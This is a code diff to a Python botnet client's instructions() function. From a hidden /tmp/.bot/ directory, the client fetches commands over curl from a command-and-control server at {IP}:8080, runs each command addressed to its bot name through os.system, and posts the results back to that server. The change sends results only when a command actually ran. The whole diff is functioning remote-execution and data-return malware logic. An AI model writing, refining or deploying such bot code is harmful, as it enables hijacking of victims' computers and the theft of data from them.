@@ -60,21 +60,24 @@ def instructions():
 	dir = '/tmp/.bot/'
 	os.chdir(dir)
 	os.system('curl http://{IP}:8080/instructions.txt > response.txt')
-	os.system("echo 'from_bot_number:' > sendthis.txt && cat name.txt >> sendthis.txt")
+	os.system("echo 'from_bot_number:' > sendthis.txt")
 	os.system("cat name.txt >> sendthis.txt")
 	os.system("echo ':' >> sendthis.txt")
 	with open('response.txt') as input_file:
 		myname = open('name.txt', 'r').read()
+		send = 0
 		for line in input_file:
 			commands = line.split()
 			mycommand = ''
 			if commands[0] == myname or commands [0] == 'any':
+				send = 1
 				for thing in commands[1:]:
 					mycommand += thing
 					mycommand += ' '
 				os.system(mycommand)
 				os.system("echo '_NextTask_' >> sendthis.txt")
-	os.system('curl --data-binary @./sendthis.txt http://{IP}:8080/instructions.txt')
+		if send == 1:
+			os.system('curl --data-binary @./sendthis.txt http://{IP}:8080/instructions.txt')
 	os.system('rm sendthis.txt response.txt')
 
 
